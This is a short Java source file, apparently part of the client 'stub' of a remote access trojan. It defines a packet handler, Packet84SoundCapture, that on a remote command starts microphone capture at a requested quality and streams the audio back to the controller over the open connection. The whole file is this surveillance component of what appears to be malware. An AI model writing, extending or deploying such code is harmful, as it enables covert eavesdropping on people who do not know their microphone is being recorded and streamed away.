package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Sound;
import com.redpois0n.stub.stub.packets.outgoing.Packet58Microphone;

public class Packet84SoundCapture extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.readBoolean()) {
			int quality = Connection.readInt();
			Connection.addToSendQueue(new Packet58Microphone());
			Sound.initialize(quality);
			Sound.write(Connection.dos);
			
			Connection.lock();
		} else {
			Connection.addToSendQueue(new Packet58Microphone());
			Sound.write(Connection.dos);
			
			Connection.lock();
		}
	}

}
